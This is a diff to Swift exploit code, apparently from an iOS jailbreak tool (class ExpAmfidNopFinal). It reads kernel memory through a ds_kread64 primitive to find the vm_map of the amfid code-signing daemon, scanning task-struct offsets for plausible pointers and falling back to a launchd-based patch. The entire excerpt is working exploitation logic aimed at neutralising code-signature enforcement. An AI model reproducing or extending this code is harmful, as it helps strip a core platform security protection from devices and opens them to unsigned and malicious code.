@@ -185,9 +185,36 @@ final class ExpAmfidNopFinal {
             return
         }
         
-        // Read vm_map
-        let vmMap = ds_kread64(amfidTask + 0x28)
-        log("  vm_map (task+0x28): 0x\(String(format:"%llx", vmMap))")
+        // Read vm_map — use off_task_map from offsets (may be 0x28)
+        // If that fails, scan nearby offsets
+        var vmMap = ds_kread64(amfidTask + UInt64(off_task_map))
+        log("  vm_map (task+0x\(String(format:"%x", off_task_map))): 0x\(String(format:"%llx", vmMap))")
+        
+        if vmMap == 0 || (vmMap >> 32) <= 0xFFFFFF00 {
+            log("  ⚠️ vm_map invalid at off_task_map — scanning...")
+            // Scan task struct for valid kernel pointers that could be vm_map
+            var found = false
+            for off: UInt64 in stride(from: 0x20, to: 0x80, by: 8) {
+                let val = ds_kread64(amfidTask + off)
+                if val != 0 && (val >> 32) > 0xFFFFFF00 && val != amfidTask {
+                    // Check if this looks like a vm_map (has a valid pmap at +0x48)
+                    let possiblePmap = ds_kread64(val + 0x48)
+                    let hasTextBase = ds_kread64(val + 0x10)
+                    log("    task+0x\(String(format:"%02x", off)) = 0x\(String(format:"%llx", val)) (pmap@+0x48=0x\(String(format:"%llx", possiblePmap)), min@+0x10=0x\(String(format:"%llx", hasTextBase)))")
+                    if (possiblePmap >> 32) > 0xFFFFFF00 && hasTextBase >= 0x100000000 && hasTextBase < 0x280000000000 {
+                        log("    ✅ Looks like vm_map! (has valid pmap + text base)")
+                        vmMap = val
+                        found = true
+                        break
+                    }
+                }
+            }
+            if !found {
+                log("❌ Cannot find vm_map in task struct")
+                performPatchViaLaunchd(amfidPid: amfidPid)
+                return
+            }
+        }
         
         guard vmMap != 0 && (vmMap >> 32) > 0xFFFFFF00 else {
             log("❌ vm_map invalid — offset may be wrong")
